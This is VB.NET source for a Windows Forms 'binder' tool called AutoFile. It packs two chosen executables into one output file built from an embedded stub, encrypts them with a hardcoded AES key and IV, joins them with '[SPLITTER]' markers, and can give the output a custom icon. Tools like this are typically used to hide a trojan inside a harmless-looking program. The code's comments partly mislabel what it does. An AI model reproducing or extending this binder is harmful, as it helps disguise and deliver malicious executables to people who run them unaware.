Imports System.IO
Imports System.Security
Imports AutoFile.Class1
Public Class Form1
    Dim F, F2 As String
    Function Secure(ByVal data As Byte()) As Byte() '取得檔案DLL.exe的API資訊
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Function UnSecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        With OpenFileDialog2
            .Filter = ".exe|*.exe"
            .InitialDirectory = TextBox4.Text
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F = .SafeFileName
                TextBox1.Text = .FileName '取得路徑1
            End If
        End With
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        With OpenFileDialog3
            .Filter = ".exe|*.exe"
            .InitialDirectory = TextBox4.Text
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F2 = .SafeFileName
                TextBox2.Text = .FileName '取得路徑2
            End If
        End With
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        With OpenFileDialog1
            .Filter = ".ico|*.ico"
            .InitialDirectory = TextBox4.Text
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                TextBox3.Text = .FileName '取得路徑3
            End If
        End With
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        With SaveFileDialog1
            .Filter = ".exe|*.exe"
            .InitialDirectory = TextBox4.Text
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                TextBox4.Text = .FileName '取得路徑4
            End If
        End With
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        If RadioButton1.Checked = True Then
            Try '用Try嘗試
                Dim sp As String = "[SPLITTER]"
                Dim buffer As Byte() = My.Resources.DLL '取得DLL.exe的Byte資源
                My.Computer.FileSystem.WriteAllBytes(TextBox4.Text, buffer, False) '將資源寫入並覆寫
                Dim file1 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text)) '讀取第一個檔案的API位元組長度
                Dim file2 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox2.Text)) '讀取第二個檔案的API位元組長度
                InjectIcon(TextBox4.Text, TextBox3.Text) '設定Ico圖
                System.IO.File.AppendAllText(TextBox4.Text, sp & Convert.ToBase64String(file1) & sp & F & sp & Convert.ToBase64String(file2) & sp & F2) '將資源寫入
                MsgBox("Binder Successfly") '如果無出現例外則顯示這訊息
            Catch ex As Exception
                MsgBox("Binder Fail") '如果出現例外則顯示這訊息
            End Try
        ElseIf RadioButton2.Checked = True Then
            Try '用Try嘗試
                Dim sp As String = "[SPLITTER]"
                Dim buffer As Byte() = My.Resources.DLL '取得DLL.exe的Byte資源
                My.Computer.FileSystem.WriteAllBytes(TextBox4.Text, buffer, False) '將資源寫入並覆寫
                Dim file1 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text)) '讀取第一個檔案的API位元組長度
                Dim file2 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox2.Text)) '讀取第二個檔案的API位元組長度
                System.IO.File.AppendAllText(TextBox4.Text, sp & Convert.ToBase64String(file1) & sp & F & sp & Convert.ToBase64String(file2) & sp & F2) '將資源寫入
                MsgBox("Binder Successfly") '如果無出現例外則顯示這訊息
            Catch ex As Exception
                MsgBox("Binder Fail") '如果出現例外則顯示這訊息
            End Try
        End If
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Close()
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Form2.Show()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MsgBox("Wecome to AutoFile", MsgBoxStyle.OkOnly)
    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        TextBox3.Enabled = False
        Button3.Enabled = False
    End Sub

    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        TextBox3.Enabled = True
        Button3.Enabled = True
    End Sub
End Class
